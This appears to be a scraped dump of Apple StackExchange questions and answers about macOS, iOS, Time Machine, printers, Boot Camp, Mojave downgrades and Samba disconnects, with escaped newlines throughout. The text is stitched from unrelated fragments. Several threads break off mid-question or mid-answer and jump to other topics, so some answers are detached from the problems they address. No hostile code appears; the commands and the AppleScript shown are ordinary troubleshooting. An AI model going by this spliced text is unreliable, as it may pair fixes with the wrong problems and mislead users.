pipe can handle a given quantity of water pressure. But at some point, if you try to put more pressure, pipes might break/explode. You would either need to use a bigger pipe (an USB-C cable for example) or reduce the pressure (in your case, the headset reduce the audio quality).\n\nA: I found the best solution to correct this if you have a mic to use. If you make the computer look for audio from a different device the headphones bounce back to the original sound quality. In my case, I used NVIDIA broadcast and selected my headphones as output and my laptop mic as the mic. This corrected my audio issues. Then in windows you get a new device called \"DEVICE NAME (NVIDIA Broadcast)\".\n", "Q: Progress bar for transferring files to iDevice on macOS 10.15 There used to be a progress bar in iTunes, when transferring files to iDevices (Apps with file sharing).

You may be lucky.  A Time Capsule is essentially a small Mac using a HFS filesystem internally to my understanding.\nIf your data is important enough to warrant spending money on them, consider contacting a professional company.\nIn the future, you may want to use the \"dump contents to external disk\" feature of the Time Capsule.

Yesterday I thought I'd try to make it work again, but the problems I face are so weird!\nThe backup goes through the \"Preparing backup...\" with no errors, and then it starts copying files. When it has gotten about two thirds of the way through the 17 GB (I'm guessing it's so large because of the update) it just quietly stops, without any error message. If I check for the backupd process in activity monitor, the CPU usage is at 0.0 and never increases. Also the drive will stop spinning after a while, so clearly nothing is written. I figured out how to print the log from the process in a terminal, and there are no messages when the process shuts down.\n\n\n*\n\n*I tried sudo sysctl debug.lowpri_throttle_enabled=0 but it doesn't make any difference.\n\n*I have reset NVRAM and SMC. No change.\n\n*I ran a First Aid on the backup drive. No issues.\n\n*Deleting .iprogress files to start over does not solve the problem.\n\n*When running in safe-mode, the backup becomes smaller and it stops earlier. But the issue remains.\nI'm using a 2018 MacBook Pro, 13 inch, with Catalina 10.15 (as mentioned), and I have two external hard drives for backups (one is encrypted and one is not). They have both worked fine with Mojave, but now I have the same problem with both.\nEdit 1: I updated to Catalina 10.15.1 and the problem persists.\nEdit 2:\nSince I am getting so little response, let me ask some more specific questions.\n\n\n*\n\n*How can I tell which file(s) is being copied when the backup process freezes? If I know which file, perhaps I can just delete it and the process will run.\n\n*Can I restart the backup from scratch? Perhaps if I rename the folder which holds the backup on the disk, Time-machine won't find it and start from scratch. And if I then want to access my old backups I can take back the previous folder name? Could this work? And which folder should try to I rename?\nEdit3: I have recently started to believe that there is some issue with backupd initiating too many threads. Whenever it freezes it shows 67 threads in the activity monitor.\n\nA: Okay, my Time Machine backups work now, and I can post this answer to my own question.\nTo print out what files are currently being copied there is a nice command in the terminal:\nsudo fs_usage -wf filesys backupd | grep HFS_update\nDoing this I could see that my backup froze at certain files, and CPU was at 0.0 usage. However, even after it had frozen, intermittently it made small steps of progress before freezing again (as I could tell from the terminal printout). And even though CPU usage showed 0.0, the total number of CPU hours were very slowly creeping up. So there was some activity in backupd, but so little it rounds to 0.0. Thus I left the computer on over night, and in the morning it had finished. It took 14 hours to finish, including several hour-long pauses when no files were written to the backup drive.\nI was using Catalina 10.15.1, but using the newly released 10.15.2 for my second backup disk I can tell that the problem persists. I then reformatted the second disk to see if that would make it any faster. But no, it takes even longer to create a new backup (20.5 hours).\nHowever, after one painfully slow backup has finished it seems to work normally, with much shorter backup times.\nRead more here:\nhttps://eclecticlight.co/2019/11/11/time-machine-and-backing-up-in-catalina/comment-page-1/?unapproved=42377&moderation-hash=3183957ce67228fdfbd8a9b757b038dc#comment-42377\n\nA: I have experienced the same issue with a MacBook Pro 2016. After updating to Catalina 10.15 it succeeded with a couple of backups, but then it got stuck. I have several disks with Time Machine backups, e.g. one LaCie Portable 4TB and one 5TB. I reset both and made fresh backups. Both got stuck when 20 GB and 30 GB remained respectively. After stopping and restarting the backup operation, the (initial) backups succeeded on both disks.\nHowever, now the backup gets stuck on \"Preparing backup\".

I think mostly in /Library & ~/Library, but also any of /etc (/private/etc), /opt, /usr, & /var (/private/var).\nCan anyone point me to a quality guide to identifying junk in those locations, that safely can, or indeed should, be disposed of?\n\nA: Touch nothing. Bigger problems come from files and software from 3rd party developers who have no (or limited) uninstallation mechanisms, which then leave cruft all over the HD, and which may have installed files in locations other than what Apple recommends. System files and apps are updated, modified and erased with successive macOS updates.\nWhen you use Migration Assistant, which has gotten more competent at its job over the years, outdated macOS System files are not transferred over. I've used MA with Time Machine backup disks for moving my user accounts to four new iMacs starting from the days of macOS Leopard.\nAt my job, we use MA exclusively to move our users to new laptops when the replacement cycle comes up. Users are given an eternal Time Machine drive which a laptop and are instructed in its use. IT staff have no time, and our users don't have the expertise, to move data and apps manually when replacement time arrives. We also require our users to use the cloud-based file storage (Google Drive in our case) for their work-related files.\n", "Q: New iCloud terms keeps coming up on my screen Since a couple of weeks back, when I start (and sometime during usage of) my Apple TV this screen comes up.  \n\n(In Swedish and it translates to...)\n\nNew terms of service for iCloud\n  You must accept the new terms of service before using iCloud on this Apple TV.\n\nIf I select Show terms I just gets the Apple TV settings, but it doesn't stop the \"new terms\" screen from appearing again later.  \n\nThe same goes for selecting Not now...  \nHow can I stop the annoying \"new terms\" screen from showing up all the time?\nCan it be done on the Apple TV or do I have to use my iPad or computer?\n\nA: As @Spiff suggested logging out of iCloud and then logging back in again solved the problem.

I have a 2019 MacBook Pro, with the Apple T2 Security Chip. I have installed Windows 10 via Boot Camp, and that is working well. I would like to turn on BitLocker in W10 and take advantage of that encryption, but when I try to enable BitLocker, Windows returns the error This device can't use a Trusted Platform Module. Is there any known way to use the T2 chip as a TPM for the purpose of enabling BitLocker?\n(I do realize one can enable BitLocker without a TPM - I am not trying to solve that problem. This is about using the T2 chip.)\n\nA: No, the T2 cannot in any way be used as a TPM for BitLocker. TPM for BitLocker is not a generic term for any type of trusted platform module, but rather it needs to be specifically the Intel TPM specification (latest version is 2.0). The T2 chip does not work in a way compatible with the TPM specification.\n", "Q: Can't connect to TCP/IP printer with undescore \"_\" in the IP I have a wireless printer that's connected to our private LAN in our workplace. There is a weird configuration for the printer that it requires two printers to be added. For color - 192.168.51.xxx and one for grayscale - 192.168.51.xxx_1 <---\nThere's a problem on MacOS that says it cannot connect to a printer with that IP but on windows it runs completely fine. The company previously worked with another IT company and they got it set up on one macbook in the entire workplace, but I cannot replicate the steps that they've taken. Maybe there's other ways to add a printer, besides the regular control panel?\nI've only seen posts about ports, but not with this kind of IP as it's unusual.\nThe printer model is - Konica Minolta INEO+ 220\n\n\nA: \nunderscore “_” in the IP\n\nIP address does not contain an underscore.\nWiki: https://en.wikipedia.org/wiki/IPv4#Addressing\n192.168.51.xxx_1 is the Port Name, not the IP address of your printer, port name is auto-generated and \"_#\" is added to avoid duplicates names. So if you are using 192.168.51.xxx_1 to connect to the printer it will not work as this is not the IP address of your printer.\n\nA: The printer will only have one IP address, and this cannot include an underscore, as commented. \n\n\n*\n\n*Check that you actually have the correct IP address for the printer. You can often print out a status report or get the IP on the printer's control panel. Check that the Mac is on the same subnet.\n\n*Have you installed any drivers for it?\n\n*You really need to find and read the documentation for the printer. If it can split colour and greyscale into separate logical paths, then this is likely to be done by print queues.\n", "Q: Dual boot dual partition and clean install of High Sierra \n*\n\n*iMac, model has been verified\n\n*Dual boot machine.\n\n*HD is SATA\n\n*Two partitions.

I come from Grub background with MBR, that's why asking question. My understanding is option key will allow booting to any partition with valid osx.\n\n\n*\n\n*Point 5 above, any confirmation from Apple doc?\n\n\n\nA: You can indeed install High Sierra without converting to APFS. I don't know how you will be running the upgrade, whether it will be by a bootable USB but you will need to make sure that you put the following in the command --converttoapfs NO.\nSo if you were running it via a USB stick from the command line then you could use a command along the lines of the following:\n/Volumes/Install\\ macOS\\ High\\ Sierra/Install\\ macOS\\ High\\ Sierra.app/Contents/Resources/startosinstall --converttoapfs NO --volume /Volumes/HFS\\ Volume\n\nwith HFS\\ Volume: the name of your \"first\" partition (e.g \"Untitled\" or \"Macintosh HD\" - don't forget to escape any blank spaces in the volume name!)\nI wouldn't recommended using the GUI installer itself as I believe that will convert your drive to APFS, running it from the command line allows you to enter the converttoapfs option.\nAlso as for dual booting you are correct as you can boot into any partition with a valid OS install by using the Option key boot modifier, or at least could the last time I tried which was a long time ago.\n", "Q: TotalResultsDaemon running as root Someone I know's macOS Mojave got taken over by something called TotalResults.\nIn the process list it shows a lot of processes TotalResults running as root.

The client will have users outside the organization (contractors) to which they will need to distribute the app.\nHow can we do this?\n\nA: Your question seems quite unclear as you seem to have given the answer together with the question.\nThe way to do this is to apply to the Apple Developer Enterprise Program. Using that account you can create an In-House Distribution Certificate that you can use to sign your app with in Xcode.\nAfter you have signed your app, you'll need to create a manifest plist file. Host the app (.ipa) and the manifest (.plist) in a folder on a web server, and send the user's an invitation via email.\nThe user will then be able to download the app, trust the enterprise profile and eventually run the app.\n", "Q: Radium doesn't work on OS X Catalina I was using Radium on OS X Mojave.

When looking at something in macOS, how can I put some kind of horizontal line so that I don't forget my position on the screen?\nLet's say I'm reading a list shown on the screen,\nand I've mentally processing the bottom quarter of the list, so I want to put a marker there so that when I come back from lunch I know where I need to resume from.\nMy ad hoc solution so far has been to position a Finder window at the point where my region starts. But I end up using Finder for other tasks and can easily loose my \"bookmark\".\n\nA: A possible alternative to using a Finder window as a bookmark is using the built-in Stickies app (if you are not using the apps as a fullscreen space).\nSimply open the Stickies app and make a new note via File > New Note. While the sticky window is selected, you can make it float on top of other windows at Window > Float on Top. This will make the sticky note remain on top of the other window, regardless of app focus. You can resize the sticky to your liking and you can even collapse it to make it much smaller.\nIt's not an elegant solution and it falls apart if the sticky or the window are moved, but it is better than using Finder as a bookmark.\nHere is an example of what it looks like floating on a list of numbers on an active Chrome window:\n\n\nA: You can use Digital Color Meter app and use it to select the location on your screen where your mouse is..  You can set it to display the coordinates of your mouse location and to display small a locked Image of where your mouse is.\nYou can then minimize Digital Color Meter app and when you bring it back to the foreground it will retain the original mouse coordinates and the image\n\n\nA: Move the window containing your list so the screen edge indicates your position. \n", "Q: make FaceTime louder How do I make the FaceTime.app sound output louder on my MacBook?\nIt's too quiet for me to hear what the people on the other end are saying.

You do not mention what dongle or microphone, you're using.\nIt sounds likely that you are using incorrect cables. The TRS plug comes in two versions - the CTIA version used on iPhone (and most Android phones), and the OMTP version used on some Android phones and especially older equipment.

All you can do is to delete the entry and add a new one. \n\nA: Solved it.\nI had the issue that a site uses a first page to get the user then uses a different url to take the pw. So the u & pw were called only by the second url.\nI used ‘+’ to add the first page url, then same u & pw. When I saved it merged the two.\n", "Q: How to run multiple instances of Firefox? My Firefox ESR installation has just updated itself to Firefox 68.2.0esr, from the previous version, and now I no longer seem to be able to run multiple instances of Firefox (using different profiles) the way I used to be able to before.\nI could start the first Firefox instance from the dock, having previously set it up to ask me which profile to use when it started, and then, when I needed to start an alternative profile, I could do so via the terminal with:\nopen -n -a 'firefox'\n\nHowever, this now just seems to open a new window of the already running Firefox, rather than a new instance (which the -n option is supposed to (and used to) start).\nIs it still possible to run multiple instances/profiles of Firefox somehow?\n\nA: Assuming you already have the proper profiles setup, try:\nopen -n -a /Applications/Firefox.app --args -no-remote\n\nMozilla seems to have recently unified behavior of the no-remote argument across all platforms.\n", "Q: iOS 13 screw-up - Songs not syncing On my iPad as well as on my iPhone, after I updated to iOS 13, I started to observe following issues:\n\n\n*\n\n*The artwork that I had painstakingly added to all my albums was just gone from some. The artwork is present in iTunes (pre-Catalina) and Music app on the Mac but it does not show anymore in iPhone or iPad.\n\n*The more sinister one was that some songs were showing on iPad and iPhone, but when I'd click on the song to play it, it would skip and play the next song in the list.

(and I really need this). ... it makes sense that iOS wants to offload some app, but why SounCloud? Many other apps are still present, untouched.\nThe strange thing is, that SoundCloud is probably the most used app on my phone, and it would be just too much, if it was offloaded/deleted even ones. Even that would not make sense. However, it just keeps be deleted over and over on regular basis. I have to reinstall the app in quite unexpected situations if I want listen to music again. Often in situations without strong data signal.\nI didn't notice that there would be any other apps, which would be offloaded/deleted prematurely like this. It seems to me, that otherwise only apps which I did not use for a long time are targeted by the system and offloaded.   \nIn the case of Soundcloud - I use it kind of at least for few hours a day. Often I can let it run from the morning to the night nonstop. Everyday! Still - after being in subway for an hour (not data signal - not using anything, or after watching YouTube for few hours - and bang! Souncloud is gone! Again! All that the system apparently needs to decide, that my SoundCloud is unused to delete it is few hours of me doing something else and it targets SounCloud preferentially and deletes it!\nMy question is actually double:\n1) First, I just really want to stop offloading this particular application (while keeping the system decide what other app was not used lately and let it automatically offload that) .. if there exist any more specific setting allowing me to make an exception for an app, that I wish the particular app to not be offloaded, I would love to use it.\n2) Second, I am just amused and curious, why that particular app might be targeted in the first place? Does not make sense at all! It even feels as if iOS is picking on SoundCloud or something. Any reasons?\nI have iPhone SE and always with the latest OS (and behavior is the same regardless on the version of iOS). I have 32 GB of memory space and it is always close to be full. ... And I keep listening something on earphones non-stop, either music on SoundCloud, or some podcast or YouTube.\n(I would suggest tags I cannot add: SoundCloud and Offloading)\n\nA: I am actually using this 'Offload' feature for a long time and I took care of my apps about whether they are still ready to use...\nBut..\nI have never seen the situation that you've faced. It's interesting for iPhone to execute Offload App command such an app which is in being used constantly.\nMy advice you to delete the app without offload and backup, directly erase the app, then install again and start from zero to use.

How do I find my previously purchased iPad apps that run on macOS using Catalyst? What happens to apps that I paid for separately already on macOS?\n\nA: You need to either contact the developer of that app to see if they've created a version using Catalyst or search the Mac App Store for a specific app name.  There's no automated way to find out if an iPad app was updated to run on the Mac.\nRight now, Apple requires a separate purchase be made.  For example, if you have a paid iPad app that the developer updated for the Mac, you would need to pay for the Mac version in the MAS, and vica-versa.\nThis could change in the future but a new purchase is required right now (not applicable for free apps, of course).\n", "Q: Detaching Process from \"Run Script Over SSH\" in Shortcuts I'm trying to use the \"Run Script Over SSH\" in Shortcuts (found under Scripting > Shell.\nI want to execute a long running command from a sharesheet.

However, I recently got an Apple Watch, and I was disappointed to find that the Watch app for Outlook does not render HTML in emails. The emails are plain text only.\nFrom what I have seen so far, the built-in Mail app on Apple Watch does a good job of rendering HTML emails. I have not had any luck finding a third-party app that can do this, though, so that I can get both HTML rendering and push notifications for email. \nDo any Watch apps that render HTML emails exist, or does Apple not allow third-party email apps to render HTML for some reason?\n\nA: The Apple Watch OS (watchOS) does permit rendering HTML email.  However, the Watch app must be built using watchOS 5 and use Webkit for the email.  It's also a poor experience to try to read html-formatted email on a small Watch screen.\nNeedless to say, most developers have not updated Watch apps specifically for this purpose and some might not ever do such an update.  \nBecause watchOS 5 is so new, it might take a while for developer to create such an app.  Keep checking the Watch App Store and your favorite app review sites to see if any are available or featured.\n", "Q: How to run an AppleScript when Safari starts up? To use uBlock Origin in Safari 12.1.1, I run it using Extension Builder 1. But I have to go by the builder tool at every Safari startup, so the blog suggested adding the script to ~/Library/Scripts/Applications/Safari. I made the necessary folders, and put the script in .scpt format there. I also locked the com.apple.Safari.Extensions.plist preferences file as said. \nBut restarting Safari didn't prompt me for the password which it did, when I ran the script in Script-Editor. So I think it is not running. \nHow can I run the script at Safari start-up? Should it be put in some different folder, or different extension? \n1 https://georgegarside.com/blog/macos/install-any-safari-extension-macos-mojave/ \n\nA: Safari won't automatically run the script on launch. The easiest way to run the script is to place the script in ~/Library/Application Scripts/com.apple.Safari, then you can run the script from the Script menu when Safari is running.\nYou can enable the Script menu if you haven't used it before from Script Editor, then the menu appears and shows all appropriate scripts.

After some looking, I discovered the cause is ~400 MB files in /private/var/tmp like this:\nWiFiDiagnostics_2019-10-23_12.58.55.713_Mac OS X_MacBookPro15,4_19A602.tgz\n\nOption-clicking on the wifi icon in the menu bar shows \"Enable Wi-Fi Logging\" (indicating it's disabled; if it's enabled, it shows \"Disable…\").\nMy findings so far:\n\n\n*\n\n*It seems to happen more frequently on certain wifi networks than others.\n\n*It seems to happen more when Wireguard is running, and more when Wireguard is in use for a VPN. (It still happens with Wireguard quit, but not as much, it seems.)\n\n*At one point, it was creating a new file (~400mb) every 5 minutes.\n\n*I've tried enabling and disabling wifi logging, without luck.\n\n\nI haven't been able to find anything on google. How do I stop the auto-generation of diagnostic logs? \nUpdate: I've updated to 10.15.1, and also did an OS reinstall (not full disk wipe), and am still getting the log files appearing.\nUpdate 2, Resolution? Short version: Somehow the command+option+control+shift+w key combo is triggering this.\nLonger version: I did a full disk wipe and reinstall, then kept an eye on when this issue reappeared and installed my normal apps slowly. This file reappeared once I installed Karabiner to make my caps-lock key map to command+control+option+shift, which I use with Alfred App to make application keyboard shortcuts.\nOne of the shortcuts I made was command+control+option+shift+w to open iTerm. I'd noticed before that hitting this key combination made the screen flash white, but I couldn't find any information (at all, anywhere) nor any existing keyboard shortcuts indicating what that key combination would do. But sure enough, 5 minutes later, I had the log file show up.\nMy belief at this point is that that particular keyboard shortcut, command+option+control+shift+w, triggers something in OS X (possibly Catalina only; I don't have an older OS to test against) that starts the wifi logging.\nI'm super interested to know how/why/where shift+control+option+command+w is actually being mapped. I've tried figuring out the com.apple.symbolichotkeys.plist file but without luck. I also tried that key combo on another Catalina install and it doesn't seem to do the same thing, so perhaps there's another app I have installed that configured that keyboard shortcut. But at this point I don't have the time to re-wipe the computer and set it up again to track it down.\n\nA: (Answering my own question, since others seem to be having this issue as well.)\nThe \"hyper+w\" (command+option+control+shift+w) key combo is triggering the the wifi logging. Note that \"hyper+>\" also seems to trigger this. I haven't been able to figure out why it's happening, but that's the culprit.\nI've used Karabiner Elements to disable those keyboard shortcuts entirely, to prevent accidentally triggering this wifi logging. Here's the relevant section from the karabiner.json file to make those key combos trigger an escape instead of the wifi logging. To add these rules, go to the \"Misc\" tab, and do the export/import \"Open config folder\", then edit the karabiner.json to include the following two rules.\n\"rules\": [\n    {\n        \"description\": \"Disabling command+control+option+shift+w.

It's called Disable WifiDiagnostics shortcuts (Free up Hyper-W) and it uses Michael Graham's solution to remap the keyboard shortcut command+control+option+shift+, to f13 so it can still be used by other applications (I detect it in Alfred).\n", "Q: Partitions: Create Bootable USB to load Windows 10 install I am using a MacBook pro running Catalina to create a bootable USB that I can use to install Windows 10 on another machine.  Initially I formatted the USB as FAT32, but the Windows setup ISO includes a file that is greater than the max file size (4 GB).\nI understand that ExFAT can handle files greater that 4 GB, but cannot be bootable.  Therefore my plan was to partition the USB to have a FAT32 bootable partition, and an ExFAT partition.  I would then load the ISO onto the second partition.\nThe problem I have now is that I cannot re-partition the USB drive.  The option in the disk utility is greyed out.  I erased it with a number of different formats, but to no avail.  I also investigated command line options for eraseDisk but it doesn't seem to take a partition size parameter.\nSo, the question is can I create a bootable USB that will store a file greater than 4GB?  How? \nSecondly, if there is a better way to go about installing Windows 10 on a bare machine, please let me know.\n\nA: Your question lack sufficient information to properly answer. I will assume the machine where you wish to install Windows is a PC and not a Mac.\nCertain Windows 10 ISO files can contain at least one file to large to be saved on a FAT32 formatted volume. However, when the same release of Windows 10 is saved to a USB flash drive by the Windows media creation tool, smaller files are substituted for the ones to large to fit on a FAT32 formatted volume.\nOne solution you be to install VirtualBox on you Mac. This is a free product. You can then use your Windows 10 ISO file to install Windows as a virtual machine. Once booted to Windows, you can download the free media create tool from Microsoft. This tool can be used to create a bootable Windows 10 installation USB flash drive. \n\nNote: After installing VirtualBox, you will need to install the VirtualBox Extension Pack in order to access a physical flash drive from the virtual machine.\n\n", "Q: How many monitors iMac 21.5 4K can handle?

Apple code signs the installers, so you are taking on risk to re-implement or bypass those checks.\n\nA: Apple distributes macOS as an installer app, so there is no such thing as a \"macOS image\". More specifically, you can certainly create an ISO image out of the installer app, but there is no official checksum to verify.\nThe installer app, which is itself a so-called bundle (a directory with a specific extension and structure) and not an executable, is only available from the Mac App Store or via Software Update (for example, this is the Mac App Store link for macOS 10.15 \"Catalina\", see this KB article for more information), which only run on a Mac.\nAlthough this may seem a limitation, it is not: Apple explicitely states that macOS must run on Apple hardware, even when virtualized (see section 2.B.iii of the Software License Agreement for macOS Catalina. Similar restrictions apply to other versions of macOS).\nSo if you don't want to download macOS from a dubious source, you will need access to a supported Mac.\n\nA: Apple has a support page on how to get valid installer boot media directly from them:  https://support.apple.com/en-us/HT201372\nEl Capitan (version 10.11) was the last version to come as a DVD image for burning to an install disk, Apple has a support page on finding that file: https://support.apple.com/en-us/HT206886\n", "Q: How can the default save format be changed for OS X Preview app?

I currently have created an automator workflow (in Catalina) that will paste in a two-step authentication code by a keyboard shortcut within the Cyberduck app. However, I am wondering how to possibly create a workflow that can automatically paste the code in via the shortcut whenever a certain pop-up comes up. For example, in Cyberduck we have:\n\nI am wondering how automator can generally be used here. I have seen something that might adhere to what I want, displayed as \"text\" in the automator workflow options:\n\nbut would like to know if this is the right path. Thanks!\n\nA: I have a solution that may work for you.  This approach will not require the use of Automator or keyboard shortcuts for pasting text into password fields. In Script Editor.app, paste this following AppleScript code into a new document and save it as a .scpt file.  I named my version Cyber_Test.scpt. For this following approach to work correctly, you will need to go into Script Editor Preferences/ General/ and select the option to \"Show Script menu in menu bar\".  \nNext, open Cyberduck.app and while it is front most, click on the Script menu in menu bar/ Open Scripts Folder/ Open Cyberduck Scripts Folder. Finder.app will then reveal and open that folder.  That is where you will need to put your version of the \"Cyber_Test.scpt\" file you previously created and saved.\n\nBecause of all those previous steps, now anytime Cyberduck.app is running and front most, you can simply run your \"Cyber_Test.scpt\" by selecting it in the Script menu in menu bar.\n\nset authenticationText to \"verification_code\"\nset cyberDuckIsRunning to application \"Cyberduck\" is running\n\nif cyberDuckIsRunning then activate application \"Cyberduck\"\n\nrepeat while cyberDuckIsRunning\n    tell application \"System Events\" to tell application process \"Cyberduck\"\n        try\n            if exists of text field 1 of sheet 1 of window 1 then\n                set value of text field 1 of sheet 1 of window 1 to authenticationText\n                delay .1\n                click button \"Continue\" of sheet 1 of window 1\n            end if\n        end try\n    end tell\n    delay 0.1\n    set cyberDuckIsRunning to application \"Cyberduck\" is running\nend repeat\n\nI was not able to produce the same verification code window as the one in your image but I was able to provoke a similar window to insert a password or verification code of sorts. Because of this, the code in my example may not work for you. If this is the case, you could follow my solution here  https://apple.stackexchange.com/a/315091/210407          About using Automator and Watch Me Do, to identify the name of Windows and other UI elements, which can then be inserted into your code.\nBasically, this script will continue to run, continually checking if the verification code window exists and if it does, will insert the text (which you will define in the authenticationText variable. Then after that, it will click the \"Continue\" button.  Then it will continue monitoring for that verification window again etc., only while Cyberduck.app is running.  When Cyberduck.app is no longer running,  the \"Cyber_Test.scpt\" will also stop running.\n\nSome people will tell you that it would be more resource efficient to create a stay open application with an idle handler... And inserting some variation of the code within the idle handler. Generally I would agree with that but for purposes of this task, the amount of code running in the repeat loop is so minimal that I don't think it makes much of a difference. On another note, if it were an application file… you would need to deal with the hassle of adding the app in your security preferences… to the list of applications allowed to control your computer. Then anytime you make changes to the code and re-save it, you will need to go back and re-add it in your Security Preferences again. With .scpt files being run from the script menu in the menu bar, I believe only System Events.app and Script Editor.app need to be added to your Security Preferences (one time only)\n", "Q: MBP will reboot after unlocking filevault partition I'm running a MBP 2015 retina with 512GB SSD with macOS 10.14 and Windows10 with bootcamp.

It contains anything that\n  the Mac OS X file system supports but the volume's own format does not.\n  You rarely see \"._\" files on HFS Plus because HFS Plus supports all the\n  metadata that Apple has defined, now or in the past.

I can't think of any modern software that uses a resource fork anymore though, so it's unlikely this is why you are seeing these files. Most of the API's are long deprecated, and Apple doesn't recommend using it to store arbitrary data. \nYou can check for such content on a file using cat filename/..namedfork/rsrc | xxd (on the main file, not the ._ file), though it might be necessary to move it to an HFS or APFS file system first, not sure. The xattr CLI tool should show it too.\nThe main thing these files are used for currently is storing extended attributes (which have some size limitations).

So I broke my macbook and I believe that the ssd is still alive with latest os x on it. If I take out the ssd and put it into a pc will it boot?\nI saw that apple forbid using their os on a non mac machine.\n\nA: No, it won't boot natively, nor will it even mount on a Windows machine without a 3rd party translator 'plugin' to be able to read HFS+ or APFS.\nFurther, if it's APFS then I think only Paragon make a translator - APFS for Windows\nThey also do one for HFS, but I think there are other alternatives - HFS+ for Windows \nDepending on what the macOS version was will depend on which of those you might need.

I want to buy a new laptop (HP) but I realized that I would have some problems to connect it to the Thunderbolt display. The new HP I want to buy has an HDMI port. I have browsed on internet where I could find a HDMI male to Thunderbolt 2 female (because I have an integrated Thunderbolt cable with the display) and there is nothing even on Amazon. I could only find adaptators with Thunderbolt male. I have searched for another way to connect the display with my new PC. On the backside, there is a Thunderbolt 2 port. Can I use this port to connect a Thunderbolt 2 to HDMI adaptator ? If you know another way I could use the integrated cable, please tell me.\nThanks\n\nA: There are two ways of connecting to the TB Display: either using the built-in 'male' cable, or the TB port on the back. Both are \"miniDisplayPort\" connectors, and can function as 'dumb' video connectors if you can get some connection from your laptop (USB-C, HDMI, etc) to a miniDisplayPort connector (either male or female).\nIf you are connecting via a non-Thunderbolt connection, then you won't get all the Thunderbolt goodness of the speakers, extra ports, webcam, etc.\n", "Q: \"An unknown error occurred\" when signing into iMessage account with Apple ID on macOS The Messages app wasn't longer able to send messages saying Not Delivered, so I signed out.

I plan to buy a MacBook Pro. But my work relies heavily on 32 bit apps for music production, which are not supported in Catalina. Can I downgrade to macOS Mojave if I buy the new MacBook Pro? \n\nA: If the machine was released during the lifetime of Mojave, then it is likely that you can downgrade the OS. But not guaranteed, depending on firmware updates and other issues. \nThe current 2019 MacBook Pros were all released earlier this year, and shipped with Mojave 10.14.5, so that release contains the drivers for the hardware. It's possible some came with special builds, so you'll need to install 10.14.6. \nIf you really need to stay sub-Catalina, then I'd recommend staying with your current Mac, or getting a newer but secondhand Mac.\n\nA: Update\nApple has released a new 16\" MacBook Pro on 13 November 2019. It replaces the 15\" MacBook Pro lineup. The new 16\" MacBook Pro comes pre-installed with macOS Catalina 10.15.1 and cannot be downgraded to run macOS Mojave, or earlier releases of macOS.\n\nYes\nSo far, year 2019 has seen three releases of MacBook Pro:\n\n\n*\n\n*13-inch, Four Thunderbolt 3 Ports (May 21, 2019).\n\n*15-inch (May 21, 2019).\n\n*13-inch, Two Thunderbolt 3 Ports (July 9, 2019).\nSource: https://en.wikipedia.org/wiki/MacBook_Pro#Technical_specifications_4\nAll three of them came pre-installed with macOS Mojave 10.14.5 (However, the build number of macOS for the former two is 18F132, and for the one released in July is 18F2058).\nSource: Mactracker macOS app\nmacOS Mojave saw a point release past 10.14.5 with the current latest public release at 10.14.6.\n\nCan I downgrade to macOS Mojave if I buy the new MacBook Pro?\n\nSo, yes it is possible to downgrade to run macOS Mojave 10.14.5 or later on all the MacBook Pro's released in 2019 till date. Even if the MacBook Pro you purchase comes pre-installed with macOS Catalina 10.15, it would be possible to install and run macOS Mojave 10.14.5 or later as the build includes the necessary drivers for the newer machines.\nNote: This above information will most likely not hold true for any newer Mac/MacBook hardware that happen to get released by Apple during the remainder of the year 2019.\n\nA: Very unlikely.\nMacs (generally) ship with the earliest operating system they will work with. The problem with previous versions of macOS is they do not have the model specific drivers to support the new features of a new Mac because they came out before that new Mac was ready.\nI have heard some rare cases where some Macs were able to work with previous versions of macOS, but those are few and far between, and getting more rare as time goes on.\nSo if you NEED a system that supports Mojave best get it now before new ones come out and you end up with a system that REALLY won't work for you.\n\nA: I got the new 16 inch MacBook Pro that shipped with macOS Catalina and my workplace apps do not support it.\nI was asked by my IT support team to downgrade to Mojave but when I called Apple Support to help with that downgrade, I came to know that it isn't possible to downgrade. \nThe App Store doesn't allow me to download Mojave, already warning me not to look that way.\nLike the pros already mentioned here, the reason could be due to the T2 chip, bridgeOS, EFI, etc.\n\nA: Yes, it's a tedious process, but you can indeed downgrade a machine pre-loaded with macOS Catalina to Mojave. You first need to download the macOS Mojave installation file from the App store, then create a bootable USB drive using that installer. You can create the bootable USB drive using the following command: Note - Make sure your USB drive is named \"Untitled\" or this won't work.\nsudo /Applications/Install\\ macOS\\ Mojave.app/Contents/Resources/createinstallmedia --volume /Volumes/Untitled --nointeraction\n\nNext, boot your system using the new USB drive (hold the option key during boot), erase the SSD in the laptop/computer using Disk Utility, and then install macOS Mojave on the freshly formatted drive. It's not the easiest process but it does work.

I tried to add a mp4 and m4a and mp3 file to iTunes while viewing Audiobooks tab but it would not add the file. How do I add an audio book to my iPhone?\niTunes Version 12.10.1.4\n\nA: I think your issue is your file type, audiobooks are usually MP3 files. MP3 files can only be used for audio, whereas MP4 files can store audio, video, still images, subtitles, and text. In technical terms, MP3 is an “audio coding” format while MP4 is a “digital multimedia container” format.\nAfter changing file format, try importing into iTunes again and syncing the files to your iPhone via USB.\n\nA: The answer is in a link in a comment.

Everything is fine, but Macs will randomly disconnect overnight, or at some irregular interval.\nOn the servers, Samba logs this as two events:\n1: ../source3/smbd/service.c:1050(close_cnum)\n2: closed connection to service data\n\nBy matching timestamps on the Macs I can see they log the drops as:\nkcm DEPRECATED USE in libdispatch client: Setting timer interval to 0 requests a 1ns timer, did you mean FOREVER (a one-shot timer)?; set a breakpoint on _dispatch_bug_deprecated to debug\n\nBy analyzing timestamps I have determined that this is the only event logged on the Mac clients' side. Here is an example client that has a shell script writing to a text file on a share every ten seconds:\n\nYou can see the connection was alive at 08:59:46 in the text file on the left, and in /var/log/system.log there's only a single relevant message.\nI asked on the Samba list serve about it and have been told the Macs are simply closing the connections.\n\nUpdate:\nWireshark analysis shows some additional information:\n\nErrors from above (Line 4):\n\n\n*\n\n*STATUS_NETWORK_SESSION_EXPIRED\n\n*SATATUS_INVALID_PARAMETER\n\n*STATUS_NETWORK_NAME_DELETED\n\n\nHere is the final SMB2 message (second from bottom): Negotiate Protocol Response:\n\nAs if to confound, there's an NT Status: STATUS_SUCCESS messages in there (see annotation).\nHere is what Microsoft says about the error:\n\nIf the Status field in the SMB2 header is\n  STATUS_NETWORK_SESSION_EXPIRED, the client MUST attempt to\n  reauthenticate the session that is identified by the SessionId in the\n  SMB2 header, as specified in section 3.2.4.2.3.

